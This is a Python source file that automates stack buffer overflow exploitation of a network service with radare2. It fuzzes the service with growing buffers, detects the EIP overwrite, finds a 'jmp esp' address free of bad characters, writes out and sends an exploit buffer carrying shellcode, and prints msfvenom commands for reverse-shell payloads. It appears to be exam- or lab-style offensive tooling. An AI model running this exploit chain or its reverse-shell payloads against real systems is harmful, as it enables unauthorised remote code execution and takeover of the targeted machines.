import r2pipe
import time
from ast import literal_eval
import socket, sys
from helpers import return_pretty_hex

class Program:
    TIMEOUT_ERROR = 10061
    CLOSED_BY_REMOTE_HOST = 10054

    def __init__(self, program_path, flags, ip, port):
        self.r2 = r2pipe.open(program_path, flags=flags)
        self.ip = ip
        self.port = port
        self.crashed_counter = -1

    def get_instr(self, instr, reg):
        self.r2.cmd("/a "+instr+ " "+reg)
        return self.r2.cmd("")

    def get_jmp_esp_addr(self, dll_path, badchars):
        esp_r2 = r2pipe.open(dll_path, flags=["-2"])
        esp_r2.cmd("/a jmp esp")
        try:
            esp_splitted = esp_r2.cmd("").split("\n")
            all_esp = []
            for esp in esp_splitted:
                splitted = esp.split(" ")[0]
                if splitted != '':
                    all_esp.append(esp.split(" ")[0])
            esp_failed = False
            for esp in all_esp:
                esp_failed = False
                bytes = [esp[i:i+2] for i in range(2, len(esp), 2)]
                for each_byte in bytes:
                    if int(each_byte,16) in badchars:
                        print("[ - ] ESP: ", esp," failed.")
                        esp_failed = True
                        break
                if not esp_failed:
                    bytes = [esp[i:i+2] for i in range(2, len(esp), 2)]
                    bytes.reverse()
                    ret = ""
                    for byte in bytes:
                        ret+=chr(int(byte,16))
                    print("[ * ] Found proper 'jmp esp' address to use. Address: ", return_pretty_hex(ret))
                    return ret
            return None
        except Exception as e:
            print("When finding proper jmp esp error occured. Error: ", e)
            return None

    def run_program(self):
        self.r2.cmd('dc') 
        self.r2.cmd('dc')
        time.sleep(2)

    def restart(self):
        self.r2.cmd("ood")
        self.r2.cmd("")
        time.sleep(2)
        #self.run_program()
        #print("Restarted program")

    def get_register_value(self, register_code):
        self.r2.cmd("dr "+register_code)
        return literal_eval(self.r2.cmd(""))

    def get_register_value_as_string(self, register_code):
        self.r2.cmd("dr "+register_code)
        return self.r2.cmd("")

    def get_register_dump(self, register_code="esp"):
        self.r2.cmd("pxq @ "+register_code)
        return self.r2.cmd("")

    def successfuly_overwrited(self, eip_should_be, offset):
        while True:
            eip_lit = self.get_register_value("eip")
            eip = int(eip_lit)
            if eip == eip_should_be:
                print("[ * ] Offset is: " , offset, ". EIP Register is successfuly overwritten with: ", hex(eip_lit))
                return True
    
    def detect_bof(self, eip_should_be):
        while True:
            eip_lit = self.get_register_value("eip")
            eip = int(eip_lit)
            if eip == eip_should_be:
                print("[ * ] Program crashed with initial buffer. EIP register is overwritten with: ", hex(eip_lit))
                return True

    def fuzz(self, prefix= "", endfix = "", counter=100):
        time.sleep(2)
        timeout = 5
        endfix = str.encode(endfix)

        string = b"A"*counter
        total_counter = counter
        while True:
            try:
                with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                    s.settimeout(timeout)
                    s.connect((self.ip, int(self.port)))
                    print("Fuzzing with {} bytes".format(len(string) - len(prefix)))
                    s.send((str.encode(prefix) + string + b"\r\n"))
                    s.recv(1024)
            except WindowsError as e:
                if e.winerror == self.CLOSED_BY_REMOTE_HOST:
                    print("Fuzzing crashed at {} bytes".format(len(string) - len(prefix)))
                    self.crashed_counter = total_counter
                    break
                elif e.winerror == self.TIMEOUT_ERROR:
                    print("Timeout occured. Program is not listening/opened.")
                    sys.exit(0)
                else:
                    print("Fuzzing crashed at {} bytes".format(len(string) - len(prefix)))
                    self.crashed_counter = total_counter
                    break
                    #sys.exit(0)
            except Exception as e:    
                print("Different error occured, closing program!")
                print("error: ", e)
                sys.exit(0)
            string += counter * b"A"
            total_counter += counter
            time.sleep(1)

    def create_file(self, prefix, filler, eip, offset, shellcode, endfix, bad_chars, output, _ip = None):
        if _ip == None:
            ip = self.ip
        else:
            ip = _ip
        port = self.port

        if type(shellcode) == str:
            shellcode = bytes(shellcode, 'latin-1')

        return_str="""
import socket
prefix = '{prefix}'
filler = {filler} * "\x41" 
eip = '{eip}'
offset = {offset} * "\x90"
buf = {shellcode}
endfix = "\\r\\n"
ip = '{ip}'
port = {port}

buffer = bytes(prefix, "latin-1") + bytes(filler, "latin-1") + bytes(eip, "latin-1") +  bytes(offset, "latin-1") + buf + bytes(endfix, "latin-1")

timeout = 5
try:
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.settimeout(timeout)
        s.connect((ip, port))
        s.send(buffer)
        s.recv(1024)
except:
    pass
        """.format(prefix=prefix,filler=filler,eip=return_pretty_hex(eip),offset=offset,shellcode=shellcode,endfix=endfix,ip=ip,port=port)
        with open(output , "w", encoding="utf-8") as f:
            f.write(return_str)
        
        with open("C:\\linux_shared\\exploit_poc.py" , "w", encoding="utf-8") as f:
            f.write(return_str)
        print("[ * ] Exploit POC file written in 'exploit_poc.py' file. Change shellcode - buff and use it.")
        print("[ * ] You can generate shellcode with using this command with proper IP and PORT. ")
        print("Windows: \tmsfvenom -p windows/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f py -b '{}'".format(return_pretty_hex(bad_chars)))
        print("Linux:   \tmsfvenom -p linux/x86/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f py -b '{}'".format(return_pretty_hex(bad_chars)))
    def exploit(self, prefix, filler, eip, offset, shellcode, endfix, _ip = None):
        time.sleep(2)
        if type(shellcode) == str:
            shellcode = bytes(shellcode, 'latin-1')
        buffer = bytes(prefix, "latin-1") + bytes(filler, "latin-1") + bytes(eip, "latin-1") +  bytes(offset, "latin-1") + shellcode + b"\r\n"

        timeout = 5
        if _ip == None:
            ip = self.ip
        else:
            ip = _ip
        port = self.port
        try:
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                s.settimeout(timeout)
                s.connect((ip, port))
                s.send(buffer)
                s.recv(1024)
        except:
            pass